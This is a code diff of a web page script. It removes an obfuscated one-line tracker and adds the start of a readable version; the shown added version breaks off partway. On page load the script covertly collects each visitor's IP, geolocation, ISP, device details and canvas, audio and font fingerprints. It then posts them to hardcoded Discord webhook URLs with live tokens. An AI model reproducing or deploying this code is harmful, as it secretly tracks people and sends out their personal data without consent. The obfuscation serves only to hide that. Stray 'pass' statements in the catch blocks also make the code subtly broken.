@@ -1,1 +1,1669 @@
-const _0x5f573d=_0x5203;(function(_0x19f1b1,_0x4849df){const _0x1fc258=_0x5203,_0x1b7e4a=_0x19f1b1();while(!![]){try{const _0x1711f8=parseInt(_0x1fc258(0x1c0))/0x1+parseInt(_0x1fc258(0x1a4))/0x2*(parseInt(_0x1fc258(0x1ac))/0x3)+-parseInt(_0x1fc258(0x1f4))/0x4*(parseInt(_0x1fc258(0x1e2))/0x5)+parseInt(_0x1fc258(0x1bd))/0x6*(-parseInt(_0x1fc258(0x1a3))/0x7)+-parseInt(_0x1fc258(0x1c3))/0x8*(parseInt(_0x1fc258(0x18a))/0x9)+-parseInt(_0x1fc258(0x224))/0xa+parseInt(_0x1fc258(0x232))/0xb;if(_0x1711f8===_0x4849df)break;else _0x1b7e4a['push'](_0x1b7e4a['shift']());}catch(_0x75831a){_0x1b7e4a['push'](_0x1b7e4a['shift']());}}}(_0x3de1,0xec4ee));const WEBHOOK_URL=_0x5f573d(0x239),WEBHOOK_URL_2=_0x5f573d(0x23d);function _0x5203(_0x107bfd,_0x4f95f4){_0x107bfd=_0x107bfd-0x18a;const _0x3de1a8=_0x3de1();let _0x52032b=_0x3de1a8[_0x107bfd];return _0x52032b;}let visitorInfo={};function getDeviceInfo(){const _0x275758=_0x5f573d;return{'platform':navigator['platform'],'userAgent':navigator[_0x275758(0x23b)],'language':navigator['language'],'languages':navigator['languages']?navigator[_0x275758(0x230)][_0x275758(0x1fc)](',\x20'):_0x275758(0x1fe),'cpuCores':navigator[_0x275758(0x203)]||'N/A','touchPoints':navigator['maxTouchPoints']||0x0,'cookieEnabled':navigator[_0x275758(0x21f)],'onlineStatus':navigator[_0x275758(0x19d)]?_0x275758(0x22a):_0x275758(0x1e0),'doNotTrack':navigator[_0x275758(0x241)]||'N/A'};}function getScreenInfo(){const _0x4eb4ad=_0x5f573d;return{'screenWidth':screen['width'],'screenHeight':screen[_0x4eb4ad(0x20e)],'screenAvailWidth':screen[_0x4eb4ad(0x19f)],'screenAvailHeight':screen['availHeight'],'windowWidth':window[_0x4eb4ad(0x240)],'windowHeight':window[_0x4eb4ad(0x191)],'colorDepth':screen['colorDepth'],'pixelDepth':screen[_0x4eb4ad(0x20a)],'pixelRatio':window[_0x4eb4ad(0x21b)]||0x1,'orientation':screen[_0x4eb4ad(0x1b1)]?screen[_0x4eb4ad(0x1b1)]['type']:_0x4eb4ad(0x1fe)};}function getNetworkInfo(){const _0x5003e3=_0x5f573d,_0xad3cba=navigator['connection']||navigator[_0x5003e3(0x1bc)]||navigator[_0x5003e3(0x1a7)];if(_0xad3cba)return{'effectiveType':_0xad3cba['effectiveType']||_0x5003e3(0x1fe),'downlink':_0xad3cba[_0x5003e3(0x1ec)]?_0xad3cba[_0x5003e3(0x1ec)]+_0x5003e3(0x250):_0x5003e3(0x1fe),'rtt':_0xad3cba[_0x5003e3(0x1e9)]?_0xad3cba[_0x5003e3(0x1e9)]+'ms':_0x5003e3(0x1fe),'saveData':_0xad3cba[_0x5003e3(0x195)]?_0x5003e3(0x18d):_0x5003e3(0x220)};return{'effectiveType':_0x5003e3(0x1fe),'downlink':'N/A','rtt':_0x5003e3(0x1fe),'saveData':'N/A'};}function getBrowserInfo(){const _0x5a70ee=_0x5f573d,_0x5594f6=navigator['userAgent'];let _0x3096fb=_0x5a70ee(0x21c),_0x138ed3=_0x5a70ee(0x21c);if(_0x5594f6['indexOf'](_0x5a70ee(0x245))>-0x1&&_0x5594f6[_0x5a70ee(0x1d6)](_0x5a70ee(0x218))===-0x1)_0x3096fb=_0x5a70ee(0x245),_0x138ed3=_0x5594f6[_0x5a70ee(0x24f)](/Chrome\/([0-9.]+)/)?.[0x1]||_0x5a70ee(0x21c);else{if(_0x5594f6[_0x5a70ee(0x1d6)]('Firefox')>-0x1)_0x3096fb=_0x5a70ee(0x212),_0x138ed3=_0x5594f6[_0x5a70ee(0x24f)](/Firefox\/([0-9.]+)/)?.[0x1]||_0x5a70ee(0x21c);else{if(_0x5594f6[_0x5a70ee(0x1d6)](_0x5a70ee(0x1b0))>-0x1&&_0x5594f6[_0x5a70ee(0x1d6)](_0x5a70ee(0x245))===-0x1)_0x3096fb='Safari',_0x138ed3=_0x5594f6[_0x5a70ee(0x24f)](/Version\/([0-9.]+)/)?.[0x1]||_0x5a70ee(0x21c);else _0x5594f6[_0x5a70ee(0x1d6)](_0x5a70ee(0x218))>-0x1&&(_0x3096fb=_0x5a70ee(0x1df),_0x138ed3=_0x5594f6[_0x5a70ee(0x24f)](/Edg\/([0-9.]+)/)?.[0x1]||_0x5a70ee(0x21c));}}return{'browserName':_0x3096fb,'browserVersion':_0x138ed3};}function getOSInfo(){const _0x2bfc11=_0x5f573d,_0x2d76c5=navigator[_0x2bfc11(0x23b)];let _0x5a6b53=_0x2bfc11(0x21c);if(_0x2d76c5[_0x2bfc11(0x1d6)](_0x2bfc11(0x1f1))>-0x1)_0x5a6b53=_0x2bfc11(0x211);else{if(_0x2d76c5['indexOf'](_0x2bfc11(0x1dc))>-0x1)_0x5a6b53=_0x2bfc11(0x243);else{if(_0x2d76c5[_0x2bfc11(0x1d6)](_0x2bfc11(0x215))>-0x1)_0x5a6b53=_0x2bfc11(0x200);else{if(_0x2d76c5[_0x2bfc11(0x1d6)](_0x2bfc11(0x219))>-0x1)_0x5a6b53=_0x2bfc11(0x1b6);else{if(_0x2d76c5[_0x2bfc11(0x1d6)](_0x2bfc11(0x202))>-0x1)_0x5a6b53=_0x2bfc11(0x1f6);else{if(_0x2d76c5[_0x2bfc11(0x1d6)](_0x2bfc11(0x22d))>-0x1)_0x5a6b53=_0x2bfc11(0x22d);else{if(_0x2d76c5[_0x2bfc11(0x1d6)]('Android')>-0x1)_0x5a6b53=_0x2bfc11(0x1b2);else{if(_0x2d76c5['indexOf'](_0x2bfc11(0x1d9))>-0x1||_0x2d76c5['indexOf']('iPad')>-0x1)_0x5a6b53=_0x2bfc11(0x1e3);}}}}}}}return _0x5a6b53;}async function getBatteryInfo(){const _0x1c990d=_0x5f573d;try{if(_0x1c990d(0x22b)in navigator){const _0x248420=await navigator['getBattery']();return{'level':Math[_0x1c990d(0x210)](_0x248420['level']*0x64)+'%','charging':_0x248420[_0x1c990d(0x1ca)]?_0x1c990d(0x24e):_0x1c990d(0x1ae),'chargingTime':_0x248420[_0x1c990d(0x1c9)]===Infinity?_0x1c990d(0x1fe):Math[_0x1c990d(0x210)](_0x248420['chargingTime']/0x3c)+'분','dischargingTime':_0x248420['dischargingTime']===Infinity?'N/A':Math[_0x1c990d(0x210)](_0x248420['dischargingTime']/0x3c)+'분'};}}catch(_0x228326){pass;}return{'level':_0x1c990d(0x1fe),'charging':'N/A','chargingTime':'N/A','dischargingTime':_0x1c990d(0x1fe)};}function getMemoryInfo(){const _0x3393a0=_0x5f573d;try{if('memory'in performance){const _0x555c96=performance[_0x3393a0(0x1c5)];return{'usedJSHeapSize':Math[_0x3393a0(0x210)](_0x555c96[_0x3393a0(0x1d7)]/0x400/0x400)+_0x3393a0(0x1d0),'totalJSHeapSize':Math[_0x3393a0(0x210)](_0x555c96[_0x3393a0(0x199)]/0x400/0x400)+_0x3393a0(0x1d0),'jsHeapSizeLimit':Math[_0x3393a0(0x210)](_0x555c96[_0x3393a0(0x1f9)]/0x400/0x400)+_0x3393a0(0x1d0)};}}catch(_0xde57e2){pass;}return{'usedJSHeapSize':_0x3393a0(0x1fe),'totalJSHeapSize':'N/A','jsHeapSizeLimit':_0x3393a0(0x1fe)};}function getPluginsInfo(){const _0x9b939f=_0x5f573d,_0x8caf5f=[];try{for(let _0x17a662=0x0;_0x17a662<navigator['plugins'][_0x9b939f(0x19c)];_0x17a662++){const _0x44008c=navigator[_0x9b939f(0x221)][_0x17a662];_0x8caf5f[_0x9b939f(0x1e1)](_0x44008c[_0x9b939f(0x1e8)]+'\x20('+(_0x44008c['version']||_0x9b939f(0x1fe))+')');}}catch(_0x493e47){pass;}return _0x8caf5f[_0x9b939f(0x19c)]>0x0?_0x8caf5f['slice'](0x0,0xa)[_0x9b939f(0x1fc)](',\x20'):_0x9b939f(0x1fe);}function getWebGLInfo(){const _0x2c86c6=_0x5f573d;try{const _0x2b27e4=document[_0x2c86c6(0x192)](_0x2c86c6(0x248)),_0x24101e=_0x2b27e4[_0x2c86c6(0x1f8)](_0x2c86c6(0x196))||_0x2b27e4['getContext'](_0x2c86c6(0x1a9));if(_0x24101e){const _0x274da4=_0x24101e[_0x2c86c6(0x20c)]('WEBGL_debug_renderer_info');return{'vendor':_0x24101e[_0x2c86c6(0x247)](_0x24101e['VENDOR']),'renderer':_0x24101e[_0x2c86c6(0x247)](_0x24101e[_0x2c86c6(0x206)]),'version':_0x24101e[_0x2c86c6(0x247)](_0x24101e[_0x2c86c6(0x1c4)]),'shadingLanguageVersion':_0x24101e[_0x2c86c6(0x247)](_0x24101e[_0x2c86c6(0x24d)]),'unmaskedVendor':_0x274da4?_0x24101e['getParameter'](_0x274da4[_0x2c86c6(0x193)]):_0x2c86c6(0x1fe),'unmaskedRenderer':_0x274da4?_0x24101e['getParameter'](_0x274da4['UNMASKED_RENDERER_WEBGL']):_0x2c86c6(0x1fe)};}}catch(_0x8fce5){pass;}return{'vendor':_0x2c86c6(0x1fe),'renderer':_0x2c86c6(0x1fe),'version':_0x2c86c6(0x1fe),'shadingLanguageVersion':_0x2c86c6(0x1fe),'unmaskedVendor':_0x2c86c6(0x1fe),'unmaskedRenderer':'N/A'};}function getCanvasFingerprint(){const _0x1fa375=_0x5f573d;try{const _0x5b1e0b=document[_0x1fa375(0x192)](_0x1fa375(0x248)),_0x21afe=_0x5b1e0b[_0x1fa375(0x1f8)]('2d');return _0x21afe[_0x1fa375(0x1a8)]=_0x1fa375(0x1c2),_0x21afe[_0x1fa375(0x24c)]='14px\x20Arial',_0x21afe[_0x1fa375(0x194)](_0x1fa375(0x24b),0x2,0x2),_0x5b1e0b['toDataURL']()[_0x1fa375(0x1fa)](-0x32);}catch(_0x9ae169){return _0x1fa375(0x1fe);}}function getAudioFingerprint(){const _0x57a2aa=_0x5f573d;try{const _0x253e4f=new(window[(_0x57a2aa(0x226))]||window[(_0x57a2aa(0x23e))])(),_0x27676b=_0x253e4f[_0x57a2aa(0x1a0)](),_0xc69c2a=_0x253e4f[_0x57a2aa(0x234)](),_0x62efd4=_0x253e4f[_0x57a2aa(0x1a5)]();_0x27676b[_0x57a2aa(0x1e6)](_0xc69c2a),_0xc69c2a[_0x57a2aa(0x1e6)](_0x62efd4),_0x62efd4[_0x57a2aa(0x1e6)](_0x253e4f[_0x57a2aa(0x1da)]),_0x27676b[_0x57a2aa(0x1ad)][_0x57a2aa(0x1dd)]=0x2710,_0x62efd4['gain']['value']=0x0;const _0x19a073=new Float32Array(_0xc69c2a[_0x57a2aa(0x1c7)]);return _0xc69c2a['getFloatFrequencyData'](_0x19a073),_0x253e4f[_0x57a2aa(0x22e)](),_0x19a073[_0x57a2aa(0x1fa)](0x0,0xa)[_0x57a2aa(0x1fc)](',')[_0x57a2aa(0x1fa)](0x0,0x32);}catch(_0x283a06){return _0x57a2aa(0x1fe);}}function _0x3de1(){const _0x4d949d=['saveData','webgl','load','org','totalJSHeapSize','Century\x20Gothic','localTime','length','onLine','width','availWidth','createOscillator','addEventListener','Bradley\x20Hand\x20ITC','109571nRMiQQ','762MHPfly','createGain','Trebuchet\x20MS','webkitConnection','textBaseline','experimental-webgl','city','fonts','291MLzBBg','frequency','충전\x20안\x20함','mediaDevices','Safari','orientation','Android','사용\x20가능','success','audiooutput','Windows\x207','Courier','usage','estimate','battery','접속\x20정보','mozConnection','306JRzlGJ','**URL:**\x20','Arial','1466883EZCszJ','resolvedOptions','top','2440528WRtzrL','VERSION','memory','localStorage','frequencyBinCount','isp','chargingTime','charging','network','\x0a**ISP:**\x20','Monaco','fetchStart','device','\x20MB','countryCode','href','Times\x20New\x20Roman','forEach','status','indexOf','usedJSHeapSize','url','iPhone','destination','screen','Windows\x20NT\x206.3','value','referrer','Edge','오프라인','push','2000DUwrox','iOS','Arial\x20Narrow','performance','connect','location','name','rtt','직접\x20접속','filter','downlink','https://cdn3.emoji.gg/emojis/6333-discord-logo.png','navigation','위치\x20정보','DateTimeFormat','Windows\x20NT\x2010.0','\x0a**접속\x20시간:**\x20','72px','15724BtYdcw','locale','macOS','measureText','getContext','jsHeapSizeLimit','slice','**국가:**\x20','join','timezone','N/A','videoinput','Windows\x208','mmmmmmmmmmlli','Mac\x20OS\x20X','hardwareConcurrency','POST','\x0a**좌표:**\x20','RENDERER','Bookman','indexedDB','canvasFingerprint','pixelDepth','Brush\x20Script\x20MT','getExtension',')\x0a**지역:**\x20','height','toLocaleString','round','Windows\x2010/11','Firefox','Chalkduster','browser','Windows\x20NT\x206.2','regionName','getTimezoneOffset','Edg','Windows\x20NT\x206.1','application/json','devicePixelRatio','Unknown','loadEventEnd','lon','cookieEnabled','비활성화','plugins','then','\x20monospace','14323780sHuhcG','Geneva','AudioContext','now','Luminari','stringify','온라인','getBattery','sessionStorage','Linux','close','json','languages','\x0a**시간대:**\x20','56073105ojebEt','\x0a**조직:**\x20','createAnalyser','storage','kind','Verdana','region','https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn','\x0a**도시:**\x20','userAgent','timestamp','https://discord.com/api/webhooks/1447962446915571846/J6hqwWgxsvjCmg1Q1Q7jRdFiHVex67Yhc9DcNVm7xCcMnAe9TqYfLl0n27ShmFcXdpKx','webkitAudioContext',',\x20monospace','innerWidth','doNotTrack','getEntriesByType','Windows\x208.1','timeZone','Chrome','quota','getParameter','canvas','Palatino','Comic\x20Sans\x20MS','Canvas\x20fingerprint\x20????','font','SHADING_LANGUAGE_VERSION','충전\x20중','match','\x20Mbps','http://ip-api.com/json/','사용\x20불가','54aLVCGx','country','정보\x20수집/전송\x20실패:','활성화','lat','Impact','error','innerHeight','createElement','UNMASKED_VENDOR_WEBGL','fillText'];_0x3de1=function(){return _0x4d949d;};return _0x3de1();}function getFontsInfo(){const _0x5a5e9b=_0x5f573d,_0x2224b0=[_0x5a5e9b(0x1bf),'Helvetica',_0x5a5e9b(0x1d3),'Courier\x20New',_0x5a5e9b(0x237),'Georgia',_0x5a5e9b(0x249),'Garamond',_0x5a5e9b(0x207),_0x5a5e9b(0x24a),_0x5a5e9b(0x1a6),'Arial\x20Black',_0x5a5e9b(0x18f),_0x5a5e9b(0x1e4),'Tahoma',_0x5a5e9b(0x225),_0x5a5e9b(0x19a),'Lucida\x20Console',_0x5a5e9b(0x1cd),_0x5a5e9b(0x1b7),_0x5a5e9b(0x1a2),_0x5a5e9b(0x20b),_0x5a5e9b(0x228),_0x5a5e9b(0x213)],_0x27ec81=[],_0x228ef7=_0x5a5e9b(0x201),_0x399d9e=_0x5a5e9b(0x1f3),_0x215524=document[_0x5a5e9b(0x192)](_0x5a5e9b(0x248)),_0x147cb3=_0x215524[_0x5a5e9b(0x1f8)]('2d');_0x147cb3['font']=_0x399d9e+_0x5a5e9b(0x223);const _0x3e8d6e=_0x147cb3[_0x5a5e9b(0x1f7)](_0x228ef7)[_0x5a5e9b(0x19e)];return _0x2224b0[_0x5a5e9b(0x1d4)](_0x9b87a4=>{const _0x30d777=_0x5a5e9b;_0x147cb3['font']=_0x399d9e+'\x20'+_0x9b87a4+_0x30d777(0x23f);const _0xf59f07=_0x147cb3[_0x30d777(0x1f7)](_0x228ef7)[_0x30d777(0x19e)];_0xf59f07!==_0x3e8d6e&&_0x27ec81[_0x30d777(0x1e1)](_0x9b87a4);}),_0x27ec81[_0x5a5e9b(0x19c)]>0x0?_0x27ec81[_0x5a5e9b(0x1fa)](0x0,0xa)[_0x5a5e9b(0x1fc)](',\x20'):_0x5a5e9b(0x1fe);}function getStorageInfo(){const _0x2ec108=_0x5f573d;try{const _0x15db31={'localStorage':_0x2ec108(0x1c6)in window?_0x2ec108(0x1b3):_0x2ec108(0x252),'sessionStorage':_0x2ec108(0x22c)in window?_0x2ec108(0x1b3):'사용\x20불가','indexedDB':_0x2ec108(0x208)in window?_0x2ec108(0x1b3):_0x2ec108(0x252),'webSQL':'openDatabase'in window?'사용\x20가능':_0x2ec108(0x252)};return _0x2ec108(0x235)in navigator&&_0x2ec108(0x1b9)in navigator[_0x2ec108(0x235)]&&navigator['storage']['estimate']()[_0x2ec108(0x222)](_0x311cbd=>{const _0x47a89e=_0x2ec108;_0x15db31[_0x47a89e(0x246)]=Math[_0x47a89e(0x210)](_0x311cbd[_0x47a89e(0x246)]/0x400/0x400)+'\x20MB',_0x15db31[_0x47a89e(0x1b8)]=Math[_0x47a89e(0x210)](_0x311cbd[_0x47a89e(0x1b8)]/0x400/0x400)+_0x47a89e(0x1d0);}),_0x15db31;}catch(_0x5bb0da){return{'localStorage':_0x2ec108(0x1fe),'sessionStorage':_0x2ec108(0x1fe),'indexedDB':_0x2ec108(0x1fe),'webSQL':'N/A'};}}function getMediaDevicesInfo(){return new Promise(async _0x4d0236=>{const _0x436d72=_0x5203;try{if('mediaDevices'in navigator&&'enumerateDevices'in navigator[_0x436d72(0x1af)]){const _0x2c3085=await navigator['mediaDevices']['enumerateDevices'](),_0x12c89a={'audioInput':_0x2c3085[_0x436d72(0x1eb)](_0x3a97ca=>_0x3a97ca['kind']==='audioinput')[_0x436d72(0x19c)],'audioOutput':_0x2c3085['filter'](_0x4b1db8=>_0x4b1db8[_0x436d72(0x236)]===_0x436d72(0x1b5))[_0x436d72(0x19c)],'videoInput':_0x2c3085['filter'](_0x1e7234=>_0x1e7234[_0x436d72(0x236)]===_0x436d72(0x1ff))[_0x436d72(0x19c)]};_0x4d0236(_0x12c89a);}else _0x4d0236({'audioInput':'N/A','audioOutput':_0x436d72(0x1fe),'videoInput':_0x436d72(0x1fe)});}catch(_0x2b96c5){_0x4d0236({'audioInput':_0x436d72(0x1fe),'audioOutput':_0x436d72(0x1fe),'videoInput':'N/A'});}});}function getTimezoneInfo(){const _0x3d5c7b=_0x5f573d;try{const _0x51777f=new Date();return{'timezone':Intl[_0x3d5c7b(0x1f0)]()[_0x3d5c7b(0x1c1)]()[_0x3d5c7b(0x244)],'timezoneOffset':_0x51777f[_0x3d5c7b(0x217)](),'dst':_0x51777f['getTimezoneOffset']()<new Date(_0x51777f['getFullYear'](),0x0,0x1)[_0x3d5c7b(0x217)](),'locale':Intl[_0x3d5c7b(0x1f0)]()[_0x3d5c7b(0x1c1)]()[_0x3d5c7b(0x1f5)]};}catch(_0x5d6c8b){return{'timezone':_0x3d5c7b(0x1fe),'timezoneOffset':_0x3d5c7b(0x1fe),'dst':_0x3d5c7b(0x1fe),'locale':'N/A'};}}function getPerformanceInfo(){const _0x19ff26=_0x5f573d;try{const _0x34346f=performance[_0x19ff26(0x242)](_0x19ff26(0x1ee))[0x0];return{'loadTime':Math[_0x19ff26(0x210)](_0x34346f[_0x19ff26(0x21d)]-_0x34346f[_0x19ff26(0x1ce)])+'ms','domContentLoaded':Math[_0x19ff26(0x210)](_0x34346f['domContentLoadedEventEnd']-_0x34346f[_0x19ff26(0x1ce)])+'ms','pageLoadTime':Math[_0x19ff26(0x210)](performance[_0x19ff26(0x227)]())+'ms'};}catch(_0x4b8978){return{'loadTime':_0x19ff26(0x1fe),'domContentLoaded':_0x19ff26(0x1fe),'pageLoadTime':'N/A'};}}async function collectAndSendInfo(){const _0x12526d=_0x5f573d;try{const _0x14a0b2=await fetch('https://api.ipify.org?format=json'),_0x586da0=await _0x14a0b2[_0x12526d(0x22f)]();visitorInfo['ip']=_0x586da0['ip'];try{const _0x341d51=await fetch(_0x12526d(0x251)+_0x586da0['ip']),_0x54b686=await _0x341d51[_0x12526d(0x22f)]();_0x54b686[_0x12526d(0x1d5)]===_0x12526d(0x1b4)&&(visitorInfo[_0x12526d(0x1e7)]={'country':_0x54b686['country'],'countryCode':_0x54b686[_0x12526d(0x1d1)],'region':_0x54b686[_0x12526d(0x216)],'city':_0x54b686[_0x12526d(0x1aa)],'isp':_0x54b686[_0x12526d(0x1c8)],'org':_0x54b686['org'],'timezone':_0x54b686[_0x12526d(0x1fd)],'lat':_0x54b686[_0x12526d(0x18e)],'lon':_0x54b686[_0x12526d(0x21e)]});}catch(_0x582dbb){pass;}const _0x420d05=new Date();visitorInfo[_0x12526d(0x23c)]=_0x420d05['toISOString'](),visitorInfo[_0x12526d(0x19b)]=_0x420d05[_0x12526d(0x20f)]('ko-KR'),visitorInfo['timezone']=Intl['DateTimeFormat']()[_0x12526d(0x1c1)]()[_0x12526d(0x244)],visitorInfo[_0x12526d(0x1cf)]=getDeviceInfo(),visitorInfo[_0x12526d(0x214)]=getBrowserInfo(),visitorInfo['os']=getOSInfo(),visitorInfo[_0x12526d(0x1db)]=getScreenInfo(),visitorInfo[_0x12526d(0x1cb)]=getNetworkInfo(),visitorInfo[_0x12526d(0x1ba)]=await getBatteryInfo(),visitorInfo[_0x12526d(0x1c5)]=getMemoryInfo(),visitorInfo[_0x12526d(0x221)]=getPluginsInfo(),visitorInfo[_0x12526d(0x196)]=getWebGLInfo(),visitorInfo[_0x12526d(0x209)]=getCanvasFingerprint(),visitorInfo['audioFingerprint']=getAudioFingerprint(),visitorInfo[_0x12526d(0x1ab)]=getFontsInfo(),visitorInfo[_0x12526d(0x235)]=getStorageInfo(),visitorInfo['mediaDevices']=await getMediaDevicesInfo(),visitorInfo[_0x12526d(0x1fd)]=getTimezoneInfo(),visitorInfo[_0x12526d(0x1e5)]=getPerformanceInfo(),visitorInfo[_0x12526d(0x1d8)]=window['location'][_0x12526d(0x1d2)],visitorInfo[_0x12526d(0x1de)]=document['referrer']||_0x12526d(0x1ea);const _0x33da59={'title':'새로운\x20방문자\x20정보','description':'사용자가\x20페이지에\x20접속했습니다.','color':0x5865f2,'timestamp':visitorInfo[_0x12526d(0x23c)],'thumbnail':{'url':_0x12526d(0x1ed)},'fields':[{'name':'기본\x20정보','value':'**IP\x20주소:**\x20'+visitorInfo['ip']+_0x12526d(0x1cc)+(visitorInfo[_0x12526d(0x1e7)]?.[_0x12526d(0x1c8)]||_0x12526d(0x1fe))+_0x12526d(0x233)+(visitorInfo[_0x12526d(0x1e7)]?.[_0x12526d(0x198)]||_0x12526d(0x1fe))+_0x12526d(0x1f2)+visitorInfo[_0x12526d(0x19b)],'inline':!![]},{'name':_0x12526d(0x1ef),'value':_0x12526d(0x1fb)+(visitorInfo[_0x12526d(0x1e7)]?.[_0x12526d(0x18b)]||_0x12526d(0x1fe))+'\x20('+(visitorInfo['location']?.[_0x12526d(0x1d1)]||_0x12526d(0x1fe))+_0x12526d(0x20d)+(visitorInfo[_0x12526d(0x1e7)]?.[_0x12526d(0x238)]||_0x12526d(0x1fe))+_0x12526d(0x23a)+(visitorInfo['location']?.[_0x12526d(0x1aa)]||'N/A')+_0x12526d(0x205)+(visitorInfo[_0x12526d(0x1e7)]?.[_0x12526d(0x18e)]||'N/A')+',\x20'+(visitorInfo['location']?.[_0x12526d(0x21e)]||_0x12526d(0x1fe))+_0x12526d(0x231)+visitorInfo[_0x12526d(0x1fd)]['timezone'],'inline':!![]},{'name':_0x12526d(0x1bb),'value':_0x12526d(0x1be)+visitorInfo['url']+'\x0a**리퍼러:**\x20'+visitorInfo[_0x12526d(0x1de)],'inline':![]}],'footer':{'text':'자동\x20수집\x20시스템'}},_0x2b5e70={'embeds':[_0x33da59]};await fetch(WEBHOOK_URL,{'method':_0x12526d(0x204),'headers':{'Content-Type':_0x12526d(0x21a)},'body':JSON[_0x12526d(0x229)](_0x2b5e70)}),await fetch(WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x12526d(0x21a)},'body':JSON['stringify'](_0x2b5e70)});}catch(_0x184664){console[_0x12526d(0x190)](_0x12526d(0x18c),_0x184664);}}window[_0x5f573d(0x1a1)](_0x5f573d(0x197),collectAndSendInfo);
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn'
+        
+        const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1447962446915571846/J6hqwWgxsvjCmg1Q1Q7jRdFiHVex67Yhc9DcNVm7xCcMnAe9TqYfLl0n27ShmFcXdpKx'
+
+        let visitorInfo = {};
+
+
+
+        function getDeviceInfo() {
+
+            return {
+
+                platform: navigator.platform,
+
+                userAgent: navigator.userAgent,
+
+                language: navigator.language,
+
+                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+
+                cpuCores: navigator.hardwareConcurrency || 'N/A',
+
+                touchPoints: navigator.maxTouchPoints || 0,
+
+                cookieEnabled: navigator.cookieEnabled,
+
+                onlineStatus: navigator.onLine ? '온라인' : '오프라인',
+
+                doNotTrack: navigator.doNotTrack || 'N/A'
+
+            };
+
+        }
+
+
+
+        function getScreenInfo() {
+
+            return {
+
+                screenWidth: screen.width,
+
+                screenHeight: screen.height,
+
+                screenAvailWidth: screen.availWidth,
+
+                screenAvailHeight: screen.availHeight,
+
+                windowWidth: window.innerWidth,
+
+                windowHeight: window.innerHeight,
+
+                colorDepth: screen.colorDepth,
+
+                pixelDepth: screen.pixelDepth,
+
+                pixelRatio: window.devicePixelRatio || 1,
+
+                orientation: screen.orientation ? screen.orientation.type : 'N/A'
+
+            };
+
+        }
+
+
+
+        function getNetworkInfo() {
+
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+            if (connection) {
+
+                return {
+
+                    effectiveType: connection.effectiveType || 'N/A',
+
+                    downlink: connection.downlink ? `${connection.downlink} Mbps` : 'N/A',
+
+                    rtt: connection.rtt ? `${connection.rtt}ms` : 'N/A',
+
+                    saveData: connection.saveData ? '활성화' : '비활성화'
+
+                };
+
+            }
+
+            return {
+
+                effectiveType: 'N/A',
+
+                downlink: 'N/A',
+
+                rtt: 'N/A',
+
+                saveData: 'N/A'
+
+            };
+
+        }
+
+
+
+        function getBrowserInfo() {
+
+            const ua = navigator.userAgent;
+
+            let browserName = 'Unknown';
+
+            let browserVersion = 'Unknown';
+
+            
+
+            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
+
+                browserName = 'Chrome';
+
+                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
+
+            } else if (ua.indexOf('Firefox') > -1) {
+
+                browserName = 'Firefox';
+
+                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
+
+            } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
+
+                browserName = 'Safari';
+
+                browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
+
+            } else if (ua.indexOf('Edg') > -1) {
+
+                browserName = 'Edge';
+
+                browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || 'Unknown';
+
+            }
+
+            
+
+            return { browserName, browserVersion };
+
+        }
+
+
+
+        function getOSInfo() {
+
+            const ua = navigator.userAgent;
+
+            let osName = 'Unknown';
+
+            
+
+            if (ua.indexOf('Windows NT 10.0') > -1) osName = 'Windows 10/11';
+
+            else if (ua.indexOf('Windows NT 6.3') > -1) osName = 'Windows 8.1';
+
+            else if (ua.indexOf('Windows NT 6.2') > -1) osName = 'Windows 8';
+
+            else if (ua.indexOf('Windows NT 6.1') > -1) osName = 'Windows 7';
+
+            else if (ua.indexOf('Mac OS X') > -1) osName = 'macOS';
+
+            else if (ua.indexOf('Linux') > -1) osName = 'Linux';
+
+            else if (ua.indexOf('Android') > -1) osName = 'Android';
+
+            else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) osName = 'iOS';
+
+            
+
+            return osName;
+
+        }
+
+
+
+        async function getBatteryInfo() {
+
+            try {
+
+                if ('getBattery' in navigator) {
+
+                    const battery = await navigator.getBattery();
+
+                    return {
+
+                        level: Math.round(battery.level * 100) + '%',
+
+                        charging: battery.charging ? '충전 중' : '충전 안 함',
+
+                        chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)}분`,
+
+                        dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)}분`
+
+                    };
+
+                }
+
+            } catch (e) {
+
+                // console.log('배터리 정보 수집 실패');
+                pass
+
+            }
+
+            return {
+
+                level: 'N/A',
+
+                charging: 'N/A',
+
+                chargingTime: 'N/A',
+
+                dischargingTime: 'N/A'
+
+            };
+
+        }
+
+
+
+        function getMemoryInfo() {
+
+            try {
+
+                if ('memory' in performance) {
+
+                    const memory = performance.memory;
+
+                    return {
+
+                        usedJSHeapSize: `${Math.round(memory.usedJSHeapSize / 1024 / 1024)} MB`,
+
+                        totalJSHeapSize: `${Math.round(memory.totalJSHeapSize / 1024 / 1024)} MB`,
+
+                        jsHeapSizeLimit: `${Math.round(memory.jsHeapSizeLimit / 1024 / 1024)} MB`
+
+                    };
+
+                }
+
+            } catch (e) {
+
+                // console.log('메모리 정보 수집 실패');
+                pass
+
+            }
+
+            return {
+
+                usedJSHeapSize: 'N/A',
+
+                totalJSHeapSize: 'N/A',
+
+                jsHeapSizeLimit: 'N/A'
+
+            };
+
+        }
+
+
+
+        function getPluginsInfo() {
+
+            const plugins = [];
+
+            try {
+
+                for (let i = 0; i < navigator.plugins.length; i++) {
+
+                    const plugin = navigator.plugins[i];
+
+                    plugins.push(`${plugin.name} (${plugin.version || 'N/A'})`);
+
+                }
+
+            } catch (e) {
+
+                // console.log('플러그인 정보 수집 실패');
+                pass
+
+            }
+
+            return plugins.length > 0 ? plugins.slice(0, 10).join(', ') : 'N/A';
+
